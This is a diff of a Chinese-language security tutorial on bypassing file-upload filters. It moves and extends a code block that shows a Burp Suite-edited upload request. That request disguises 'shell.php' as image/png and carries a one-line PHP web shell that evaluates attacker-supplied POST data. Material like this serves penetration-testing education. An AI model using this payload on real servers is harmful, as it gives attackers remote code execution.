@@ -147,11 +147,6 @@
 
 **核心绕过公式**：
 在Burp Suite中修改上传请求包：
-```
-POST /upload.php HTTP/1.1
-...
-Content-Disposition: form-data; name="file"; filename="shell.php"
-Content-Type: image/png  // 将此处的 application/x-php 修改为 image/png
 
 ![](img/947e57d7f948904cbccfa779eab77467_96.png)
 
@@ -159,6 +154,11 @@ Content-Type: image/png  // 将此处的 application/x-php 修改为 image/png
 
 ![](img/947e57d7f948904cbccfa779eab77467_100.png)
 
+```
+POST /upload.php HTTP/1.1
+...
+Content-Disposition: form-data; name="file"; filename="shell.php"
+Content-Type: image/png  // 将此处的 application/x-php 修改为 image/png
 <?php @eval($_POST[‘cmd‘]);?>
 ```
 
